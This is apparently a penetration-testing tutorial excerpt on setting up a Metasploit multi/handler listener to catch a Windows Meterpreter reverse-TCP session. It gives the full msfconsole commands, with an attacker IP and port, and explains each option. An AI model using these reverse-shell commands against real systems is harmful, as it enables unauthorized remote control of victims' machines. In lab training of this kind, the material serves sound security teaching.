msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp

# Set LHOST to your Kali Linux IP (must match payload generation)
msf6 exploit(multi/handler) > set LHOST 192.168.1.100

# Set LPORT to the port used during payload generation
msf6 exploit(multi/handler) > set LPORT 4444

# Start the listener
msf6 exploit(multi/handler) > exploit
Listener Options Explained
PAYLOAD

Must exactly match the payload generated by `msfvenom`.

LHOST

Your Kali Linux IP, where the session will connect back.

LPORT

The port on your Kali machine to listen on.

Setting Up the Listener

Catching the Incoming Meterpreter Session

A Metasploit `multi/handler` listener is essential to receive the Meterpreter session from your executed payload.

  • •Must be running *before* the target interacts with the exploit.
  • •`PAYLOAD`, `LHOST`, and `LPORT` must match payload generation.
  • •Failure to set up correctly results in a lost session.
Key Takeaway

The listener is the final piece of the puzzle, ensuring you can establish control once the exploit is triggered.
